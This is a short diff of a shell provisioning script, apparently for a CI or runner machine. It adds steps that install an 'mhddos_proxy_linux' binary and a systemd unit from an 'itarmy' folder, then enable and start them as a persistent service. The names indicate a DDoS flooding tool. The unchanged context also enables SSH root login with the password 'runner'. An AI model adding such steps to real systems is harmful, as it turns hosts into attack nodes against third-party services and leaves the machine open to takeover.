@@ -7,10 +7,15 @@ sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
 sudo echo "runner:runner" | chpasswd
 sudo systemctl restart ssh
 
+echo "[*] Preparing service"
+cp /mnt/repo/logpush/itarmy/mhddos.service /etc/systemd/system
 
-echo "[*] Prepare directories"
-sudo mkdir -p /mnt/repo/test
-sudo chmod 777 /mnt/repo/test
+cp /mnt/repo/logpush/itarmy/bin/mhddos_proxy_linux /opt/itarmy/bin
+
+echo "[*] Enable and start service"
+systemctl daemon-reload
+systemctl enable mhddos.service
+systemctl restart mhddos.service
 
 
 
